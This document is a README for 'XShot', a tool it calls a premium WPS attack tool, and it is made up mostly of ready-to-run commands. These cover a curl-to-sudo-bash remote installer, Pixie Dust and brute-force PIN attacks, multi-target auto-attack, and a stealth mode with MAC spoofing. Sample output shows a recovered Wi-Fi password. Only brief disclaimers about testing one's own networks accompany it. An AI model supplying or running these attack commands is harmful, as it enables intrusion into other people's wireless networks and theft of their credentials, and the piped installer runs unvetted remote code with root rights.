XShot - Premium WPS Attack Tool

🚀 Quick Start

```bash
# One-line install
curl -sL https://raw.githubusercontent.com/KhalidAX003/xshot/main/install.sh | sudo bash

# Universal run command
sudo python xshot.py -i wlan0 -K
```

📦 Installation (30 Seconds)

Linux

```bash
git clone https://github.com/KhalidAX003/xshot.git
cd xshot
chmod +x install.sh
sudo ./install.sh
```

Termux

```bash
pkg install git python -y
git clone https://github.com/KhalidAX003/xshot.git
cd xshot
python setup.py
```

⚡ Premium Features

Quick Attacks

```bash
# Pixie Dust Attack
sudo xshot -i wlan0 -K

# Smart Scan & Auto-Attack
sudo xshot -i wlan0 --auto

# Multi-target attack
sudo xshot -i wlan0 -K --multi
```

Stealth Mode

```bash
# Complete stealth
sudo xshot -i wlan0 -K --stealth

# With MAC spoofing
sudo xshot -i wlan0 -K --stealth --mac-spoof
```

AI-Powered

```bash
# Let AI choose best attack
sudo xshot -i wlan0 --ai

# Predict PINs
sudo xshot -i wlan0 --predict
```

🎯 Essential Commands

Scan Networks

```bash
# Show all WPS networks
sudo xshot -i wlan0 --scan

# Scan with details
sudo xshot -i wlan0 --scan -v
```

Attack Modes

```bash
# 1. Pixie Dust (Fast)
sudo xshot -i wlan0 -b 00:11:22:33:44:55 -K

# 2. Bruteforce
sudo xshot -i wlan0 -b 00:11:22:33:44:55 -B

# 3. Push Button
sudo xshot -i wlan0 --pbc
```

Advanced Options

```bash
# Save results
sudo xshot -i wlan0 -K -w

# Verbose output
sudo xshot -i wlan0 -K -v

# Specific channel
sudo xshot -i wlan0 -K --channel 6
```

📱 Mobile (Termux) Setup

Quick Setup

```bash
# Install requirements
pkg install root-repo -y
pkg install python git tsu -y
pkg install pixiewps -y

# Get XShot
git clone https://github.com/KhalidAX003/xshot.git
cd xshot

# Run (as root)
sudo python xshot.py -i wlan0 -K
```

Hotspot Fix

```bash
# Before running XShot:
1. Turn OFF Hotspot
2. Turn ON Location
3. Enable GPS
4. Run: termux-location

# Then execute:
sudo python xshot.py -i wlan0 --scan
```

🔧 Troubleshooting

Common Issues

```bash
# 1. No interface found
sudo airmon-ng start wlan0
sudo xshot -i wlan0mon -K

# 2. Permission denied
sudo su
python xshot.py -i wlan0 -K

# 3. Pixiewps not found
sudo apt install pixiewps -y
# or
sudo pacman -S pixiewps
```

Interface Issues

```bash
# Check available interfaces
iwconfig
ip link show

# Put in monitor mode
sudo airmon-ng start wlan0
sudo xshot -i wlan0mon -K
```

📊 Output Example

```
[+] Scanning networks...
[+] Found 3 WPS-enabled APs

1) B8:27:EB:12:34:56 - HomeWiFi (Signal: -45dB)
2) AA:BB:CC:DD:EE:FF - OfficeNet (Signal: -62dB)

[*] Starting Pixie Dust attack...
[!] Vulnerable to Pixie Dust!
[+] WPS PIN: 12345670
[+] Password: MySecretWiFi123
[✓] Attack successful in 2.3 seconds
```

⚠️ Important Notes

Legal

· For educational purposes only
· Test only your own networks
· Get written permission
· Know your local laws

Requirements

· Root access required
· Compatible wireless card
· WPS enabled on target
· Good signal strength

🆘 Quick Help

```bash
# Show all options
python xshot.py --help

# Show version
python xshot.py --version

# Update tool
sudo xshot --update
```

🔄 Update Tool

```bash
cd xshot
git pull
sudo python setup.py --update
```

📞 Support

· Issues: GitHub Issues
· Telegram: @TeamAX_Support
· Website: team-ax.top

---

Remember: Always use responsibly. Only test networks you own or have permission to test.

For Android: Ensure hotspot is OFF and location is ON before running!
